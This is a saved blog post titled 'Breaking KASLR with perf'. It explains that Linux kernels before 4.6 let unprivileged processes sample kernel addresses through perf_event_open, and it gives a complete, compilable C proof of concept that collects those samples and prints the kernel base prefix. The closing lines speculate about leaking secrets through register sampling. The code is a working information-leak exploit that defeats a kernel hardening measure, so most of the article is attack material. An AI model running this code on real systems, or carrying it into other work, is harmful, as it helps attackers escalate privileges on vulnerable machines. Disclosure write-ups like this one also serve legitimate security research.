<!DOCTYPE html>
<!-- saved from url=(0042)https://blog.lizzie.io/kaslr-and-perf.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Breaking KASLR with perf</title>
<!-- 2019-02-18 Mon 02:58 -->

<meta name="generator" content="Org-mode">
<meta name="author" content="Lizzie Dixon">
<link rel="icon" href="data:;base64,="><style type="text/css">@media (max-width: 1000) {
    pre {
	font-size: 8pt;
    }
}

body{
    margin: 1em auto;
    max-width: 62em;
    line-height: 1.6;
    color: #444;
    padding: 0 1em;
    font-size: 14pt;
}

p {
    text-align: justify;
}

input {
    font-size: 14pt;
}

a:visited {
    color: #666;
}

a {
    color: #555;
}

h1 {
    margin: 0.5em 0;
}

h1, h2, h3 {
    line-height: 1.2
}

[src$=".svg"] {
    width: 100%;
}

.org-src-container {
    margin: 1em;
}

pre {
    padding: 2em;
    overflow: auto;
    background-color: #eeeeee;
}

pre.example {
    margin: 1em;
}

table {
    background-color: #eeeeee;
    margin: 2em;
}

td  {
    padding: 0.75em 2em;
}

.mono {
    font-family: monospace;
}

li {
    padding: 0.1em 0;
}


#table-of-contents {
    width: 40%;
    float: right;
    padding: 0 2em;
}

#table-of-contents ul {
    padding: 0 1.2em;
    margin: 0;
}

#table-of-contents h2 {
    margin: 0.2em;
}

label.org-src-name {
    color: #666;
    margin-bottom: 1em;
}

label.org-src-name code {
    color: #666;
}

code {
    word-break: break-all;
}

span.navigation-links a, span.self-links a {
    padding-right: 0.4em;
}

span.self-links {
    float: right;
}

span.listing-number, span.figure-number {
    display: none;
}

div.figure {
    text-align: center;
    font-size: 0.8em;
    color: #777;
    max-width: 100%;
}

div.figure img, div.figure video, div.prompt {
    -webkit-box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.75);
    -moz-box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.75);
    box-shadow: 0px 0px 10px 0px rgba(0,0,0,0.75);
    border: 1px solid #444;
    max-width: 100%;
}

/* MailChimp Form Embed Code - Horizontal Super Slim - 12/16/2015 v10.7
Adapted from: http://blog.heyimcat.com/universal-signup-form/ */

#mc_embed_signup form {text-align:center; padding:10px 0 10px 0;}
.mc-field-group { display: inline-block; } /* positions input field horizontally */
#mc_embed_signup input.email {border: 1px solid #444;  -webkit-border-radius: 3px; -moz-border-radius: 3px; border-radius: 3px; color: #343434; background-color: #fff; box-sizing:border-box; height:32px; padding: 0px 0.4em; display: inline-block; margin: 0; max-width:300px; vertical-align:top;}
#mc_embed_signup .clear {display: inline-block;} /* positions button horizontally in line with input */
#mc_embed_signup .button {border: 1px solid #444; -webkit-border-radius: 3px; -moz-border-radius: 3px; border-radius: 3px; letter-spacing: .03em; color: #fff; background-color: #777; box-sizing:border-box; height:32px; line-height:32px; padding:0 18px; display: inline-block; margin: 0; transition: all 0.23s ease-in-out 0s;}
#mc_embed_signup .button:hover {background-color:#555; cursor:pointer;}
#mc_embed_signup div#mce-responses {float:left; top:-1.4em; padding:0em .5em 0em .5em; overflow:hidden; width:90%;margin: 0 5%; clear: both;}
#mc_embed_signup div.response {margin:1em 0; padding:1em .5em .5em 0; font-weight:bold; float:left; top:-1.5em; z-index:1; width:80%;}
#mc_embed_signup #mce-error-response {display:none;}
#mc_embed_signup #mce-success-response {color:#529214; display:none;}
#mc_embed_signup label.error {display:block; float:none; width:auto; margin-left:1.05em; text-align:left; padding:.5em 0;}
#mc_embed_signup input.email { display: inline-block; margin-bottom:5px;}
#mc_embed_signup .button { margin:0; }

div.prompt {
    border-radius: 3px;
    padding: 10px;
    margin: 10px;
    background-color: #fff;
    text-align:center;
    max-width: 800px;
    margin-left: auto;
    margin-right: auto;
    background-color: #fffaa2;
}

div.prompt-close {
    float: right;
    padding-left: 10px;
    padding-bottom: 10px;
    cursor: pointer;
    color: #777;
    font-size: 0.8em;
    font-weight: bold;
    margin-top: -5px;
}
</style><script>window.onload = function () {
    if (window.location.pathname !== "/"
	&& document.cookie.split(/ *; */).indexOf("closed_form=yes") < 0) {
	var prompt = document.createElement("div");
	var close = document.createElement("div");
	var content = document.getElementById("content");
	var h1 = content.getElementsByTagName("h1")[0];

	prompt.className = "prompt";
	prompt.innerHTML = "Like this writing? Subscribe to receive updates on vulnerabilities and software projects as soon as I publish them!<br><div id=\"mc_embed_signup\"><form action=\"https://lizzie.us20.list-manage.com/subscribe/post?u=a2011719c1a5ce9e37e7c3e82&amp;id=43ce08f401\" method=\"post\" id=\"mc-embedded-subscribe-form\" name=\"mc-embedded-subscribe-form\" class=\"validate\" target=\"_blank\" novalidate><div id=\"mc_embed_signup_scroll\"><input type=\"email\" value=\"\" name=\"EMAIL\" class=\"email\" id=\"mce-EMAIL\" placeholder=\"email address\" required><div style=\"position: absolute; left: -5000px;\" aria-hidden=\"true\"><input type=\"text\" name=\"b_a2011719c1a5ce9e37e7c3e82_43ce08f401\" tabindex=\"-1\" value=\"\"></div> <div class=\"clear\"><input type=\"submit\" value=\"subscribe\" name=\"asubscribe\" id=\"mc-embedded-subscribe\" class=\"button\"></div></div></form></div>";

	close.innerHTML = "×";
	close.className = "prompt-close";	
	close.onclick = function () {
	    content.removeChild(prompt);
	    document.cookie = "closed_form=yes";
	}

	prompt.insertBefore(close, prompt.firstChild);
	content.insertBefore(prompt, h1.nextSibling);
    }
}
</script><meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="alternate" type="application/rss+xml" href="https://blog.lizzie.io/rss.xml">
</head>
<body>
<div id="navigation"><span class="navigation-links"><a href="https://blog.lizzie.io/rss.xml">rss</a> <a href="https://blog.lizzie.io/">home</a> </span><span class="self-links"><a href="https://github.com/startling">github</a> <a href="mailto:_@lizzie.io">email</a></span></div><div id="content">
<h1 class="title">Breaking KASLR with <code>perf</code></h1><div class="prompt"><div class="prompt-close">×</div>Like this writing? Subscribe to receive updates on vulnerabilities and software projects as soon as I publish them!<br><div id="mc_embed_signup"><form action="https://lizzie.us20.list-manage.com/subscribe/post?u=a2011719c1a5ce9e37e7c3e82&amp;id=43ce08f401" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" target="_blank" novalidate=""><div id="mc_embed_signup_scroll"><input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL" placeholder="email address" required=""><div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_a2011719c1a5ce9e37e7c3e82_43ce08f401" tabindex="-1" value=""></div> <div class="clear"><input type="submit" value="subscribe" name="asubscribe" id="mc-embedded-subscribe" class="button"></div></div></form></div></div>
<p>
Before Linux 4.6, the default value of
<code>/proc/sys/kernel/perf_event_paranoid</code> was 1, and so any Linux process
could sample kernel addresses with <a href="http://man7.org/linux/man-pages/man2/perf_event_open.2.html"><code>perf_event_open</code></a>'s
<code>PERF_SAMPLE_IP</code>. So you can break <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization#KASLR">KASLR</a> by sampling the addresses and
taking the mininum.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 1: </span><code>perf_rip_find.c</code></label><pre class="src src-C">/* -*- compile-command: "gcc -Wall perf_rip_find.c -o perf_rip_find" -*- */
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;linux/perf_event.h&gt;
#include &lt;linux/hw_breakpoint.h&gt;
#include &lt;asm/perf_regs.h&gt;
#include &lt;sys/utsname.h&gt;
#include &lt;signal.h&gt;

#define PAGE_SIZE 4096
#define DATA_SIZE PAGE_SIZE
#define MMAP_SIZE (PAGE_SIZE + DATA_SIZE)
#define MASK 0xffffff

int perf_event_open(struct perf_event_attr *attr,
		    pid_t pid,
		    int cpu,
		    int group_fd,
		    unsigned long flags)
{
	return syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}


int main (int argc, char **argv)
{
	int return_code = 0;
	int read_fd = -1;
	int fd = -1;

	pid_t child = 0;
	switch ((child = fork())) {
	case -1:
		fprintf(stderr, "fork failed: %m\n");
		goto error;
	case 0:;
		struct utsname self = {0};
		while (1) uname(&amp;self);
		goto cleanup;
	default:
		break;
		
	}
	if ((fd = perf_event_open(
		     &amp; (struct perf_event_attr) {
			.type = PERF_TYPE_SOFTWARE,
			.config = PERF_COUNT_SW_TASK_CLOCK,
			.size = sizeof(struct perf_event_attr),
			.disabled = 1,
			.exclude_user = 1,
			.exclude_hv = 1,
			.sample_type = PERF_SAMPLE_IP,
			.sample_period = 10,
			.precise_ip = 1,
		     }, child, -1, -1, 0)) &lt; 0) {
		fprintf(stderr, "perf_event_open failed!\n");
		goto error;
	}
	struct perf_event_mmap_page *meta_page = NULL;
	if ((meta_page =  mmap(NULL,
			       MMAP_SIZE,
			       PROT_READ | PROT_WRITE,
			       MAP_SHARED,
			       fd, 0)) == MAP_FAILED) {
		fprintf(stderr, "mmap failed: %m\n");
		goto error;
	}
	if (ioctl(fd, PERF_EVENT_IOC_ENABLE)) {
		fprintf(stderr, "ioctl failed: %m\n");
		goto error;
	}
	char *data_page = ((char *) meta_page) + PAGE_SIZE;

	size_t progress = 0;
	uint64_t last_head = 0;
	size_t num_samples = 0;
	uint64_t min = ~0;
	while (num_samples &lt; 100) {
		/* is reading from the meta_page racy? no idea */
		while (meta_page-&gt;data_head == last_head);;
		last_head = meta_page-&gt;data_head;

		while (progress &lt; last_head) {
			struct __attribute__((packed)) sample {
				struct perf_event_header header;
				uint64_t ip;
			} *here = (struct sample *) (data_page + progress % DATA_SIZE);
			switch (here-&gt;header.type) {
			case PERF_RECORD_SAMPLE:
				num_samples++;
				if (here-&gt;header.size &lt; sizeof(*here)) {
					fprintf(stderr, "size too small.\n");
					goto error;
				}
				uint64_t prefix = here-&gt;ip &amp; ~MASK;
				if (prefix &lt; min) min = prefix;
				break;
			case PERF_RECORD_THROTTLE:
			case PERF_RECORD_UNTHROTTLE:
			case PERF_RECORD_LOST:
				break;
			default:
				fprintf(stderr,
                                        "unexpected event: %x\n",
                                        here-&gt;header.type);
				goto error;
			}
			progress += here-&gt;header.size;
		}
		/* tell the kernel we read it. */
		meta_page-&gt;data_tail = last_head;
	}
	fprintf(stderr, "%016lx\n", min);
	goto cleanup;
error:
	return_code =  1;
cleanup:
	if (child) kill(child, SIGKILL);
	if (read_fd &gt; 0) close(read_fd);
	if (fd &gt; 0) close(fd);
	return return_code;
	
}
</pre>
</div>

<p>
You can also sample registers (<code>PERF_SAMPLE_REGS_INTR</code>) , which
worries me, but I couldn't convince it to leak the network secret or
the urandom seed. Probably possible, though. Good luck!
</p>
</div>


</body></html>